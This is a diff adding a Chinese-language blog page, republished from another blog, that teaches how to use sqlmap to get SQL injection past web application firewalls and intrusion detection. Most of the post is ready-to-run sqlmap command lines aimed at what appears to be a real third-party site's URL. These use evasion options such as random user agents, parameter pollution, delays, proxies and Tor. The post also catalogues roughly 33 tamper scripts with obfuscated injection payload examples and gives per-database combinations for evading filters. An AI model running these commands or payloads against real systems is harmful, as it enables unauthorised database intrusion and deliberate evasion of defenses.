@@ -1,0 +1,522 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="攻VS防，战略与战术！马拉松式工作！">
+    <title>使用sqlmap 绕过防火墙进行注入测试 - 攻VS防，战略与战术！马拉松式工作！</title>
+    <meta name="author" content="Lao k17">
+    
+        <meta name="keywords" content="hexo,javascript,安全,">
+    
+    
+    
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Lao k17","sameAs":["https://paper.seebug.org/","https://js.tuisec.win/convert/ox2str/","https://www.cvedetails.com/","http://www.expku.com/","https://wy.tuisec.win/","https://s.threatbook.cn/"],"image":"https://www.gravatar.com/avatar/11cf39ebba4716a5945df93991af2a69"},"articleBody":"PS: 内容摘自煜铭2011的博客http://blog.csdn.net/qq_29277155，仅供传阅学习！0x00 前言   现在的网络环境往往是WAF/IPS/IDS保护着Web 服务器等等，这种保护措施往往会过滤挡住我们的SQL注入查询链接，甚至封锁我们的主机IP，所以这个时候，我们就要考虑怎样进行绕过，达到注入的目标。因为现在WAF/IPS/IDS都把sqlmap 列入黑名单了，呵呵！但是本文基于sqlmap 进行绕过注入测试，介绍至今仍然实用有效的技巧，以下策略在特定的环境能够成功绕过，具体是否绕过，请仔细查看输出的信息。0x01 确认WAF     首先我们判断该Web 服务器是否被WAF/IPS/IDS保护着。这点很容易实现，因为我们在漏扫或者使用专门工具来检测是否有WAF，这个检测，在nmap 的NSE，或者WVS的策略或者APPSCAN的策略中都有，我们可以利用这些来判断。在此我们，也介绍使用sqlmap 进行检测是否有WAF/IPS/IDSroot@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.PHP?id=51&amp;types=4&quot; –thread 10 –identify-waf#首选root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot; –thread 10  –check-waf#备选0x02 使用参数进行绕过root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot; –random-agent -v 2 #使用任意浏览器进行绕过，尤其是在WAF配置不当的时候root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot; –hpp -v 3#使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot; –delay=3.5 –time-sec=60 #使用长的延时来避免触发WAF的机制，这方式比较耗时root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot; –proxy=211.211.211.211:8080 –proxy-cred=211:985#使用代理进行注入root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot; –ignore-proxy#禁止使用系统的代理，直接连接进行注入root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot; –flush-session#清空会话，重构注入root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot; –hex#或者使用参数 –no-cast ，进行字符码转换root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;  –mobile #对移动端的服务器进行注入root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot; –tor # 匿名注入0x03 使用脚本介绍1 使用格式：root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot; –tamper=A.py,B.py#脚本A，脚本B2 脚本总类01 apostrophemask.py#用utf8代替引号；Example: (“1 AND ‘1’=’1”) ‘1 AND %EF%BC%871%EF%BC%87=%EF%BC%871’02 equaltolike.py#MSSQL  SQLite中like 代替等号；Example:  Input: SELECT  FROM users WHERE id=1 ；Output: SELECT  FROM users WHERE id LIKE 103 greatest.py#MySQL中绕过过滤’&gt;’ ,用GREATEST替换大于号；Example: (‘1 AND A &gt; B’) ‘1 AND GREATEST(A,B+1)=A’04 space2hash.py#空格替换为#号 随机字符串 以及换行符；Input: 1 AND 9227=9227；Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=922705 apostrophenullencode.py#MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号；06 halfversionedmorekeywords.py#当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论；07 space2morehash.py#MySQL中空格替换为 #号 以及更多随机字符串 换行符；08 appendnullbyte.py#Microsoft Access在有效负荷结束位置加载零字节字符编码；Example: (‘1 AND 1=1’) ‘1 AND 1=1%00’09 ifnull2ifisnull.py#MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’10 space2mssqlblank.py(mssql)#mssql空格替换为其它空符号11base64encode.py#用base64编码j Example: (“1’ AND SLEEP(5)#”) ‘MScgQU5EIFNMRUVQKDUpIw==’ Requirement: all12 space2mssqlhash.py#mssql查询中替换空格13 modsecurityversioned.py#(mysql中过滤空格，包含完整的查询版本注释;Example: (‘1 AND 2&gt;1–’) ‘1 /!30874AND 2&gt;1/–’14 space2mysqlblank.py#(mysql中空格替换其它空白符号15 between.py#MS SQL 2005，MySQL 4, 5.0 and 5.5  Oracle 10g  PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（&gt;）16 space2mysqldash.py#MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）17 multiplespaces.py#围绕SQL关键字添加多个空格；Example: (‘1 UNION SELECT foobar’) ‘1 UNION SELECT foobar’18 space2plus.py#用+替换空格；Example: (‘SELECT id FROM users’) ‘SELECT+id+FROM+users’19 bluecoat.py#MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like20 nonrecursivereplacement.py#双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filters21 space2randomblank.py#代替空格字符（“”）从一个随机的空白字符可选字符的有效集22 sp_password.py#追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾23 chardoubleencode.py#双url编码(不处理以编码的)24 unionalltounion.py#替换UNION ALL SELECT UNION SELECT；Example: (‘-1 UNION ALL SELECT’) ‘-1 UNION SELECT’25 charencode.py#Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0url编码；26 randomcase.py#Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写27 unmagicquotes.py#宽字符绕过 GPC addslashes；Example:  Input: 1′ AND 1=1 * Output: 1%bf%27 AND 1=1–%2028 randomcomments.py#用//分割sql关键字；Example:‘INSERT’ becomes ‘IN//S//ERT’29 charunicodeencode.py#ASP，ASP.Net中字符串 unicode 编码；30 securesphere.py#追加特制的字符串；Example: (‘1 AND 1=1’) “1 AND 1=1 and ‘0having’=’0having’”31 versionedmorekeywords.py#MySQL &gt;= 5.1.13注释绕过32 space2comment.py#Replaces space character (‘ ‘) with comments ‘//’33 halfversionedmorekeywords.py#MySQL &lt; 5.1中关键字前加注释\n0x04脚本参数组合策略绕过1 mysql绕过：root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot; –random-agent -v 2 -delay=3.5 –tamper=space2hash.py,modsecurityversioned.pyroot@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot; –random-agent –hpp  –tamper=space2mysqldash.p,versionedmorekeywords.pyroot@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;  -delay=3.5  —-user-agent=” Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/38.0.696.12 Safari/534.24” –tamper=apostrophemask.py,equaltolike.py备注：这些组合策略可以根据注入的反馈信息，及时调整组合策略2 MSSQL：root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;  -delay=3.5  —-user-agent=” Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/38.0.696.12 Safari/534.24” –tamper=randomcase.py,charencode.pyroot@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;  –delay=3.5 –hpp –tamper=space2comment.py,randomcase.pyroot@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;  –delay=3.5 –time-sec=120  –tamper=space2mssqlblank.py,securesphere.pyroot@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;  –delay=3.5 –tamper=unionalltounion.py,base64encode.p3 ms access:root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;  –delay=3.5 –random-agent  –tamper=appendnullbyte.py,space2plus.pyroot@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;  –delay=3.5 –random-agent –hpp  –tamper=chardoubleencode.py4 Oracle：root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;  –delay=5 –random-agent –hpp –tamper=unmagicquotes.py,unionalltounion.pyroot@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;  –delay=5–user-agent =“Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0” –hpp –tamper=charunicodeencode.py,chardoubleencode.py5 建议：      因为WAF可能采用白名单规则，所以对于选择哪种策略，重点是根据-v 3 提示的信息进行判断，可以抓取主流的浏览器的user-agent ,s适当的延时，加上注入字符转换—大小写、空格、字符串、注释、加密等等方式      鉴于参数和32种脚本，在我们平时的注入，这些通过不同的多重组合来进行测试，这个测试或者比较耗时\n","dateCreated":"2017-03-02T15:13:48+08:00","dateModified":"2017-03-02T15:20:04+08:00","datePublished":"2017-03-02T15:13:48+08:00","description":"PS: 内容摘自煜铭2011的博客http://blog.csdn.net/qq_29277155，仅供传阅学习！0x00 前言   现在的网络环境往往是WAF/IPS/IDS保护着Web 服务器等等，这种保护措施往往会过滤挡住我们的SQL注入查询链接，甚至封锁我们的主机IP，所以这个时候，我们就要考虑怎样进行绕过，达到注入的目标。因为现在WAF/IPS/IDS都把sqlmap 列入黑名单了，呵呵！但是本文基于sqlmap 进行绕过注入测试，介绍至今仍然实用有效的技巧，以下策略在特定的环境能够成功绕过，具体是否绕过，请仔细查看输出的信息。0x01 确认WAF     首先我们判断该Web 服务器是否被WAF/IPS/IDS保护着。这点很容易实现，因为我们在漏扫或者使用专门工具来检测是否有WAF，这个检测，在nmap 的NSE，或者WVS的策略或者APPSCAN的策略中都有，我们可以利用这些来判断。在此我们，也介绍使用sqlmap 进行检测是否有WAF/IPS/IDSroot@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.PHP?id=51&amp;types=4&quot; –thread 10 –identify-waf#首选root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot; –thread 10  –check-waf#备选0x02 使用参数进行绕过root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot; –random-agent -v 2 #使用任意浏览器进行绕过，尤其是在WAF配置不当的时候root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot; –hpp -v 3#使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot; –delay=3.5 –time-sec=60 #使用长的延时来避免触发WAF的机制，这方式比较耗时root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot; –proxy=211.211.211.211:8080 –proxy-cred=211:985#使用代理进行注入root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot; –ignore-proxy#禁止使用系统的代理，直接连接进行注入root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot; –flush-session#清空会话，重构注入root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot; –hex#或者使用参数 –no-cast ，进行字符码转换root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;  –mobile #对移动端的服务器进行注入root@kali:~# sqlmap -u “http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot; –tor # 匿名注入0x03 使用脚本介绍","headline":"使用sqlmap 绕过防火墙进行注入测试","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://s-sec.github.io/2017/03/02/使用sqlmap-绕过防火墙进行注入测试/"},"publisher":{"@type":"Organization","name":"Lao k17","sameAs":["https://paper.seebug.org/","https://js.tuisec.win/convert/ox2str/","https://www.cvedetails.com/","http://www.expku.com/","https://wy.tuisec.win/","https://s.threatbook.cn/"],"image":"https://www.gravatar.com/avatar/11cf39ebba4716a5945df93991af2a69","logo":{"@type":"ImageObject","url":"https://www.gravatar.com/avatar/11cf39ebba4716a5945df93991af2a69"}},"url":"http://s-sec.github.io/2017/03/02/使用sqlmap-绕过防火墙进行注入测试/","keywords":"sqlmap, 教程, 黑客"}</script>
+    <meta name="description" content="PS: 内容摘自煜铭2011的博客http://blog.csdn.net/qq_29277155，仅供传阅学习！0x00 前言   现在的网络环境往往是WAF/IPS/IDS保护着Web 服务器等等，这种保护措施往往会过滤挡住我们的SQL注入查询链接，甚至封锁我们的主机IP，所以这个时候，我们就要考虑怎样进行绕过，达到注入的目标。因为现在WAF/IPS/IDS都把sqlmap 列入黑名单了，呵呵">
+<meta name="keywords" content="sqlmap,教程,黑客">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="使用sqlmap 绕过防火墙进行注入测试">
+<meta property="og:url" content="http://s-sec.github.io/2017/03/02/使用sqlmap-绕过防火墙进行注入测试/index.html">
+<meta property="og:site_name" content="攻VS防，战略与战术！马拉松式工作！">
+<meta property="og:description" content="PS: 内容摘自煜铭2011的博客http://blog.csdn.net/qq_29277155，仅供传阅学习！0x00 前言   现在的网络环境往往是WAF/IPS/IDS保护着Web 服务器等等，这种保护措施往往会过滤挡住我们的SQL注入查询链接，甚至封锁我们的主机IP，所以这个时候，我们就要考虑怎样进行绕过，达到注入的目标。因为现在WAF/IPS/IDS都把sqlmap 列入黑名单了，呵呵">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2017-03-02T07:20:04.328Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="使用sqlmap 绕过防火墙进行注入测试">
+<meta name="twitter:description" content="PS: 内容摘自煜铭2011的博客http://blog.csdn.net/qq_29277155，仅供传阅学习！0x00 前言   现在的网络环境往往是WAF/IPS/IDS保护着Web 服务器等等，这种保护措施往往会过滤挡住我们的SQL注入查询链接，甚至封锁我们的主机IP，所以这个时候，我们就要考虑怎样进行绕过，达到注入的目标。因为现在WAF/IPS/IDS都把sqlmap 列入黑名单了，呵呵">
+    
+    
+        
+    
+    
+    
+    
+    
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/style-3frockyt2j28isvdztjchy5nhkz8tjki9ermufc1ckptmvjdftux94m2ahub.min.css">
+    <!--STYLES END-->
+    
+
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+
+<header id="header" data-behavior="4">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a class="header-title-link" href="/ ">攻VS防，战略与战术！马拉松式工作！</a>
+    </div>
+    
+        
+            <a  class="header-right-picture "
+                href="#about">
+        
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+<nav id="sidebar" data-behavior="4">
+    <div class="sidebar-container">
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/ "
+                            
+                            title="home"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">home</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-categories"
+                            
+                            title="categories"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">categories</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-tags"
+                            
+                            title="tags"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">tags</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-archives"
+                            
+                            title="archives"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">archives</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link open-algolia-search"
+                             href="#search"
+                            
+                            title="search"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">search</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="#about"
+                            
+                            title="about"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">about</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="https://paper.seebug.org/" target="_blank" rel="noopener" title="seebug paper">
+                    
+                        <i class="sidebar-button-icon fab fa-seebug" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">seebug paper</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="https://js.tuisec.win/convert/ox2str/" target="_blank" rel="noopener" title="decode tools">
+                    
+                        <i class="sidebar-button-icon fab fa-decode" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">decode tools</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="https://www.cvedetails.com/" target="_blank" rel="noopener" title="cvedetails">
+                    
+                        <i class="sidebar-button-icon fab fa-cvedetails" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">cvedetails</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="http://www.expku.com/" target="_blank" rel="noopener" title="exp库">
+                    
+                        <i class="sidebar-button-icon fab fa-edb" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">exp库</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="https://wy.tuisec.win/" target="_blank" rel="noopener" title="乌云历史库">
+                    
+                        <i class="sidebar-button-icon fab fa-wy" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">乌云历史库</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="https://s.threatbook.cn/" target="_blank" rel="noopener" title="微步沙箱">
+                    
+                        <i class="sidebar-button-icon fab fa-sandboxie" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">微步沙箱</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/atom.xml"
+                            
+                            title="RSS"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+            <div id="main" data-behavior="4"
+                 class="
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post">
+    
+    
+        <div class="post-header main-content-wrap text-left">
+    
+        <h1 class="post-title">
+            使用sqlmap 绕过防火墙进行注入测试
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time datetime="2017-03-02T15:13:48+08:00">
+	
+		    02 3月 2017
+    	
+    </time>
+    
+        <span>in </span>
+        
+    <a class="category-link" href="/categories/安全技术/">安全技术</a>
+
+
+    
+</div>
+
+    
+</div>
+
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <p><strong>PS</strong>: 内容摘自煜铭2011的博客<a href="http://blog.csdn.net/qq_29277155，仅供传阅学习！" target="_blank" rel="noopener">http://blog.csdn.net/qq_29277155，仅供传阅学习！</a><br>0x00 前言<br>   现在的网络环境往往是WAF/IPS/IDS保护着Web 服务器等等，这种保护措施往往会过滤挡住我们的SQL注入查询链接，甚至封锁我们的主机IP，所以这个时候，我们就要考虑怎样进行绕过，达到注入的目标。因为现在WAF/IPS/IDS都把sqlmap 列入黑名单了，呵呵！但是本文基于sqlmap 进行绕过注入测试，介绍至今仍然实用有效的技巧，以下策略在特定的环境能够成功绕过，具体是否绕过，请仔细查看输出的信息。<br>0x01 确认WAF<br>     首先我们判断该Web 服务器是否被WAF/IPS/IDS保护着。这点很容易实现，因为我们在漏扫或者使用专门工具来检测是否有WAF，这个检测，在nmap 的NSE，或者WVS的策略或者APPSCAN的策略中都有，我们可以利用这些来判断。在此我们，也介绍使用sqlmap 进行检测是否有WAF/IPS/IDS<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.PHP?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.PHP?id=51&amp;types=4&quot;</a> –thread 10 –identify-waf#首选<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –thread 10  –check-waf#备选<br>0x02 使用参数进行绕过<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –random-agent -v 2 #使用任意浏览器进行绕过，尤其是在WAF配置不当的时候<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –hpp -v 3#使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –delay=3.5 –time-sec=60 #使用长的延时来避免触发WAF的机制，这方式比较耗时<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –proxy=211.211.211.211:8080 –proxy-cred=211:985#使用代理进行注入<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –ignore-proxy#禁止使用系统的代理，直接连接进行注入<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –flush-session#清空会话，重构注入<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –hex#或者使用参数 –no-cast ，进行字符码转换<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a>  –mobile #对移动端的服务器进行注入<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –tor # 匿名注入<br>0x03 使用脚本介绍<br><a id="more"></a><br>1 使用格式：<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –tamper=A.py,B.py#脚本A，脚本B<br>2 脚本总类<br>01 apostrophemask.py#用utf8代替引号；Example: (“1 AND ‘1’=’1”) ‘1 AND %EF%BC%871%EF%BC%87=%EF%BC%871’<br>02 equaltolike.py#MSSQL <em> SQLite中like 代替等号；Example:  Input: SELECT </em> FROM users WHERE id=1 ；Output: SELECT <em> FROM users WHERE id LIKE 1<br>03 greatest.py#MySQL中绕过过滤’&gt;’ ,用GREATEST替换大于号；Example: (‘1 AND A &gt; B’) ‘1 AND GREATEST(A,B+1)=A’<br>04 space2hash.py#空格替换为#号 随机字符串 以及换行符；Input: 1 AND 9227=9227；Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227<br>05 apostrophenullencode.py#MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号；<br>06 halfversionedmorekeywords.py#当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论；<br>07 space2morehash.py#MySQL中空格替换为 #号 以及更多随机字符串 换行符；<br>08 appendnullbyte.py#Microsoft Access在有效负荷结束位置加载零字节字符编码；Example: (‘1 AND 1=1’) ‘1 AND 1=1%00’<br>09 ifnull2ifisnull.py#MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’<br>10 space2mssqlblank.py(mssql)#mssql空格替换为其它空符号<br>11base64encode.py#用base64编码j Example: (“1’ AND SLEEP(5)#”) ‘MScgQU5EIFNMRUVQKDUpIw==’ Requirement: all<br>12 space2mssqlhash.py#mssql查询中替换空格<br>13 modsecurityversioned.py#(mysql中过滤空格，包含完整的查询版本注释;Example: (‘1 AND 2&gt;1–’) ‘1 /</em>!30874AND 2&gt;1<em>/–’<br>14 space2mysqlblank.py#(mysql中空格替换其它空白符号<br>15 between.py#MS SQL 2005，MySQL 4, 5.0 and 5.5 </em> Oracle 10g <em> PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（&gt;）<br>16 space2mysqldash.py#MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）<br>17 multiplespaces.py#围绕SQL关键字添加多个空格；Example: (‘1 UNION SELECT foobar’) ‘1 UNION SELECT foobar’<br>18 space2plus.py#用+替换空格；Example: (‘SELECT id FROM users’) ‘SELECT+id+FROM+users’<br>19 bluecoat.py#MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like<br>20 nonrecursivereplacement.py#双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filters<br>21 space2randomblank.py#代替空格字符（“”）从一个随机的空白字符可选字符的有效集<br>22 sp_password.py#追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾<br>23 chardoubleencode.py#双url编码(不处理以编码的)<br>24 unionalltounion.py#替换UNION ALL SELECT UNION SELECT；Example: (‘-1 UNION ALL SELECT’) ‘-1 UNION SELECT’<br>25 charencode.py#Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0url编码；<br>26 randomcase.py#Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写<br>27 unmagicquotes.py#宽字符绕过 GPC addslashes；Example: </em> Input: 1′ AND 1=1 * Output: 1%bf%27 AND 1=1–%20<br>28 randomcomments.py#用/<strong>/分割sql关键字；Example:‘INSERT’ becomes ‘IN//S//ERT’<br>29 charunicodeencode.py#ASP，ASP.Net中字符串 unicode 编码；<br>30 securesphere.py#追加特制的字符串；Example: (‘1 AND 1=1’) “1 AND 1=1 and ‘0having’=’0having’”<br>31 versionedmorekeywords.py#MySQL &gt;= 5.1.13注释绕过<br>32 space2comment.py#Replaces space character (‘ ‘) with comments ‘/</strong>/’<br>33 halfversionedmorekeywords.py#MySQL &lt; 5.1中关键字前加注释</p>
